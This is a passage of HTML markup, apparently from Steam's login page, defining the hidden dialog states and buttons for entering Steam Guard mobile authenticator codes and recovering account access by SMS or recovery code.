					<div class="auth_modal_h1">Whoops!</div>
					<p>Sorry but, <br>that isn't quite right...</p>
				</div>
				<div class="twofactorauth_message" id="login_twofactorauth_message_selfhelp" style="display: none;">
					<div class="auth_modal_h1">Let us help!</div>
					<p>Sorry you're having trouble.  We know your Steam account is valuable to you, and we're committed to helping you keep access to it in the right hands.</p>
				</div>
				<div class="twofactorauth_message" id="login_twofactorauth_message_selfhelp_sms_remove" style="display: none;">
					<div class="auth_modal_h1">Confirm ownership of your account</div>
					<p>We'll send a text message containing an account recovery code to your phone number ending in <span id="login_twofactorauth_selfhelp_sms_remove_last_digits"></span>. Once you enter the code, we will remove the mobile authenticator from your account and you will receive Steam Guard codes via email.</p>
				</div>
				<div class="twofactorauth_message" id="login_twofactorauth_message_selfhelp_sms_remove_entercode" style="display: none;">
					<div class="auth_modal_h1">Confirm ownership of your account</div>
					<p>We have sent a text message containing a confirmation code to your phone number ending in <span id="login_twofactorauth_selfhelp_sms_remove_entercode_last_digits"></span>. Enter the code below so we can remove the mobile authenticator from your account.</p>
				</div>
				<div class="twofactorauth_message" id="login_twofactorauth_message_selfhelp_sms_remove_incorrectcode" style="display: none;">
					<div class="auth_modal_h1">Whoops!</div>
					<p>Sorry but, <br>that isn't quite right...</p>
				</div>
				<div class="twofactorauth_message" id="login_twofactorauth_message_selfhelp_twofactor_removed" style="display: none;">
					<div class="auth_modal_h1">Success!</div>
					<p>We have removed the mobile authenticator from your account. Next time you log in, you will have to enter a Steam Guard code that is sent to your email address.</p>
				</div>
				<div class="twofactorauth_message" id="login_twofactorauth_message_selfhelp_twofactor_replaced" style="display: none;">
					<div class="auth_modal_h1">Success!</div>
					<p>You can now use this device to get mobile authenticator codes for your account. Any other device that was previously providing authenticator codes for your account will no longer be able to do so.</p>
				</div>
				<div class="twofactorauth_message" id="login_twofactorauth_message_selfhelp_nosms" style="display: none;">
					<div class="auth_modal_h1">Do you have the recovery code?</div>
					<p>You do not have a phone number associated with your Steam account, so we are unable to verify account ownership via a text message. Do you have the recovery code that you wrote down when you added the mobile authenticator? The recovery code begins with the letter 'R'.</p>
				</div>
				<div class="twofactorauth_message" id="login_twofactorauth_message_selfhelp_rcode" style="display: none;">
					<div class="auth_modal_h1">Enter your recovery code</div>
					<p>Please enter the recovery code in the box below. The recovery code begins with the letter 'R'.</p>
				</div>
				<div class="twofactorauth_message" id="login_twofactorauth_message_selfhelp_rcode_incorrectcode" style="display: none;">
					<div class="auth_modal_h1">Whoops!</div>
					<p>Sorry but, <br>that isn't quite right...</p>
				</div>
				<div class="twofactorauth_message" id="login_twofactorauth_message_selfhelp_rcode_incorrectcode_exhausted" style="display: none;">
					<div class="auth_modal_h1">Whoops!</div>
					<p>Sorry but, <br>that isn't quite right...</p>
				</div>
				<div class="twofactorauth_message" id="login_twofactorauth_message_selfhelp_rcode_message" style="display: none;">
					<div class="auth_modal_h1">Whoops!</div>
					<p>Sorry but, <br>that isn't quite right...</p>
				</div>
				<div class="twofactorauth_message" id="login_twofactorauth_message_selfhelp_couldnthelp" style="display: none;">
					<div class="auth_modal_h1">Let us help!</div>
					<p>If you have lost access to your mobile device, the mobile phone number associated with your account, and don't have the recovery code that you wrote down when you added the mobile authenticator, then please contact Steam Support for assistance recovering access to your account.</p>
				</div>
				<div class="twofactorauth_message" id="login_twofactorauth_message_help" style="display: none;">
					<div class="auth_modal_h1">Let us help!</div>
					<p>Sorry you're having trouble.  We know your Steam account is valuable to you, and we're committed to helping you keep access to it in the right hands.</p>
				</div>
				<div class="twofactorauth_message" id="login_twofactorauth_message_selfhelp_failure" style="display: none;">
					<div class="auth_modal_h1">Sorry!</div>
					<p>There was an error encountered while processing your request.</p>
				</div>
			</div>
		</div>
		<div id="login_twofactorauth_details_messages" class="twofactorauth_details_messages">
			<div class="twofactorauth_details" id="login_twofactorauth_details_entercode" style="display: none;">
				Enter the current code displayed in the Steam Mobile app:			</div>
			<div class="twofactorauth_details" id="login_twofactorauth_details_selfhelp" style="display: none;">
				If you have lost your mobile device or uninstalled the Steam app and can no longer receive codes, then you may remove the mobile authenticator from your account. This will reduce the security on your account, so you should add a mobile authenticator to a new mobile device afterwards.			</div>
			<div class="twofactorauth_details" id="login_twofactorauth_details_help" style="display: none;">
				Please contact Steam Support for assistance from a member of our staff.			</div>
			<div class="twofactorauth_details" id="login_twofactorauth_details_selfhelp_failure" style="display: none;">
			</div>
			<div class="twofactorauth_details" id="login_twofactorauth_details_selfhelp_rcode_incorrectcode" style="display: none;">
			</div>
			<div class="twofactorauth_details" id="login_twofactorauth_details_selfhelp_rcode_incorrectcode_exhausted" style="display: none;">
			</div>
		</div>
		<div class="twofactorauthcode_entry_area">
			<div id="login_twofactor_authcode_entry">
				<div class="twofactorauthcode_entry_box">
					<input class="twofactorauthcode_entry_input authcode_placeholder" id="twofactorcode_entry" type="text" placeholder="enter your code here" autocomplete="off">
				</div>
			</div>
			<div id="login_twofactor_authcode_help_supportlink">
				<a href="https://support.steampowered.com/kb_article.php?ref=4020-ALZM-5519&amp;l=english">
					Contact Steam Support for help with account access				</a>
			</div>
		</div>
		<div class="modal_buttons" id="login_twofactorauth_buttonsets">
			<div class="auth_buttonset" id="login_twofactorauth_buttonset_entercode" style="display: none;">
				<div type="submit" class="auth_button leftbtn" data-modalstate="submit">
					<div class="auth_button_h3">Submit</div>
					<div class="auth_button_h5">my authenticator code</div>
				</div>
				<div class="auth_button" data-modalstate="selfhelp">
					<div class="auth_button_h3">Please help</div>
					<div class="auth_button_h5">I no longer have access to my Mobile Authenticator codes</div>
				</div>
				<div style="clear: left;"></div>
			</div>
			<div class="auth_buttonset" id="login_twofactorauth_buttonset_incorrectcode" style="display: none;">
				<div class="auth_button leftbtn" data-modalstate="submit">
					<div class="auth_button_h3">I want to try again</div>
					<div class="auth_button_h5">and I've re-entered my authenticator code above</div>
				</div>
				<div class="auth_button" data-modalstate="selfhelp">
					<div class="auth_button_h3">Please help</div>
					<div class="auth_button_h5">I think I need assistance from Steam Support...</div>
				</div>
				<div style="clear: left;"></div>
			</div>
			<div class="auth_buttonset" id="login_twofactorauth_buttonset_selfhelp" style="display: none;">
				<div class="auth_button leftbtn" data-modalstate="selfhelp_sms_remove_start">
					<div class="auth_button_h3" style="font-size: 16px;">Remove authenticator</div>
					<div class="auth_button_h5">and go back to receiving codes by email</div>
				</div>
				<div class="auth_button" data-modalstate="selfhelp_sms_reset_start">
					<div class="auth_button_h3">Use this device</div>
					<div class="auth_button_h5">and get authenticator codes on this app</div>
				</div>
			</div>
			<div class="auth_buttonset" id="login_twofactorauth_buttonset_selfhelp_sms_remove" style="display: none;">
				<div class="auth_button leftbtn" data-modalstate="selfhelp_sms_remove_sendcode">
					<div class="auth_button_h3">OK!</div>
					<div class="auth_button_h5">Send me the text message</div>
				</div>
				<div class="auth_button" data-modalstate="selfhelp_nosms">
					<div class="auth_button_h3">I can't</div>
					<div class="auth_button_h5">because I no longer have access to that phone number</div>
				</div>
			</div>
			<div class="auth_buttonset" id="login_twofactorauth_buttonset_selfhelp_sms_remove_entercode" style="display: none;">
				<div class="auth_button leftbtn" data-modalstate="selfhelp_sms_remove_checkcode">
					<div class="auth_button_h3">Submit</div>
					<div class="auth_button_h5">I entered the code above</div>
				</div>
				<div class="auth_button" data-modalstate="selfhelp_nosms">
					<div class="auth_button_h3">Please help</div>
					<div class="auth_button_h5">I'm not receiving the text message</div>
				</div>
			</div>
			<div class="auth_buttonset" id="login_twofactorauth_buttonset_selfhelp_sms_remove_incorrectcode" style="display: none;">
				<div class="auth_button leftbtn" data-modalstate="selfhelp_sms_remove_checkcode">
					<div class="auth_button_h3">Submit</div>
					<div class="auth_button_h5">I re-entered the code. Let's try again.</div>
				</div>
				<div class="auth_button" data-modalstate="selfhelp_nosms">
					<div class="auth_button_h3">Please help</div>
					<div class="auth_button_h5">I'm not receiving the text message</div>
				</div>
			</div>
			<div class="auth_buttonset" id="login_twofactorauth_buttonset_selfhelp_twofactor_removed" style="display: none;">
				<div class="auth_button leftbtn" data-modalstate="selfhelp_sms_remove_complete">
					<div class="auth_button_h3">Log in</div>
					<div class="auth_button_h5">with the mobile authenticator removed</div>
				</div>
			</div>
			<div class="auth_buttonset" id="login_twofactorauth_buttonset_selfhelp_twofactor_replaced" style="display: none;">
				<div class="auth_button leftbtn" data-modalstate="selfhelp_sms_remove_complete">
					<div class="auth_button_h3">Log in</div>
					<div class="auth_button_h5">to the Steam Mobile app</div>
				</div>
			</div>
			<div class="auth_buttonset" id="login_twofactorauth_buttonset_selfhelp_nosms" style="display: none;">
				<div class="auth_button leftbtn" data-modalstate="selfhelp_rcode">
					<div class="auth_button_h3">Yes</div>
					<div class="auth_button_h5">I have the recovery code that begins with 'R'</div>
				</div>
				<div class="auth_button" data-modalstate="selfhelp_couldnthelp">
					<div class="auth_button_h3">No</div>
					<div class="auth_button_h5">I don't have a code like that</div>
				</div>
			</div>
			<div class="auth_buttonset" id="login_twofactorauth_buttonset_selfhelp_rcode" style="display: none;">
				<div class="auth_button leftbtn" data-modalstate="selfhelp_rcode_checkcode">
					<div class="auth_button_h3">Submit</div>
					<div class="auth_button_h5">my recovery code</div>
				</div>
				<div class="auth_button" data-modalstate="selfhelp_couldnthelp">
					<div class="auth_button_h3">Please help</div>
					<div class="auth_button_h5">I think I need assistance from Steam Support...</div>
				</div>
			</div>
			<div class="auth_buttonset" id="login_twofactorauth_buttonset_selfhelp_rcode_incorrectcode" style="display: none;">
				<div class="auth_button leftbtn" data-modalstate="selfhelp_rcode_checkcode">
					<div class="auth_button_h3">Submit</div>
					<div class="auth_button_h5">I re-entered the code. Let's try again.</div>
				</div>
				<div class="auth_button" data-modalstate="selfhelp_couldnthelp">
					<div class="auth_button_h3">Please help</div>
					<div class="auth_button_h5">I think I need assistance from Steam Support...</div>
				</div>
			</div>
			<div class="auth_buttonset" id="login_twofactorauth_buttonset_selfhelp_rcode_incorrectcode_exhausted" style="display: none;">
				<div class="auth_button" data-modalstate="selfhelp_couldnthelp">
					<div class="auth_button_h3">Please help</div>
					<div class="auth_button_h5">I think I need assistance from Steam Support...</div>
				</div>
			</div>
			<div class="auth_buttonset" id="login_twofactorauth_buttonset_selfhelp_couldnthelp" style="display: none;">
				<a class="auth_button leftbtn" href="https://help.steampowered.com/">
					<div class="auth_button_h3">Contact us</div>
					<div class="auth_button_h5">for help with account access</div>
				</a>
			</div>
			<div class="auth_buttonset" id="login_twofactorauth_buttonset_waiting" style="display: none;">
			</div>
		</div>
		<div style="display: none;">
			<input type="submit">
		</div>
		</form>
	</div>
</div></body></html>